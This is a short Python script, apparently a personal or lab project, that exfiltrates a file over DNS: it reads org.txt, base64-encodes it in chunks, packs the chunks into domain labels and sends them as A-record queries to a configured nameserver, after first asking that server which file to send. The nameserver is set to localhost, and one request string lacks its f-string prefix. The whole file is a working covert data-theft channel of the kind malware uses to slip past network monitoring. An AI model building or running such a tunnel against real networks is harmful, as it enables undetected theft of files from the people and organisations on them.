__author__ = "Adel Tchernitsky"


import dns.resolver
import base64


DNS_SERVER = "127.0.0.1"
FILE_NAME = "org.txt"  # The file should be decided by server
REQUEST_FILE_TYPE = "TXT"
RECORD_TYPE = "A"
FILE_REQUEST_INDICATOR = "-"
FILE_CONTENT_INDICATOR = "_"
FINAL_MESSAGE = "end"


def b64_encode(data):
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def dot_every_n(s, n):
    return ".".join(s[i:i+n] for i in range(0, len(s), n))


def split_bytes(data, chunk_size):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def get_file(file_name):
    with open(file_name, "rb") as f:
        return f.read()


def generate_messages(file_name, chunk_size, n):
    chunks = split_bytes(get_file(file_name), chunk_size)  # Make constant
    return [dot_every_n(b64_encode(ch), n) for ch in chunks] + [FINAL_MESSAGE]


def ask_for_file(resolver):
    request_domain = b64_encode(b"which.{FILE_REQUEST_INDICATOR}file")

    try:
        answers = resolver.resolve(request_domain, REQUEST_FILE_TYPE)

        for rdata in answers:
            print(f"Response: {rdata}")

    except Exception as e:
        print(f"Error requesting file: {e}")


def send_file(file_name, resolver):
    messages = generate_messages(file_name, 12, 2)
    print(messages)

    for domain in messages:
        try:
            answers = resolver.resolve(domain, RECORD_TYPE)

            for rdata in answers:
                print(f"THIS IS IMPORTANT Response: {rdata}")

        except Exception as e:
            print(f"Error: {e}")
            return


def main():
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [DNS_SERVER]

    ask_for_file(resolver)
    send_file(FILE_NAME, resolver)


if __name__ == "__main__":
    main()
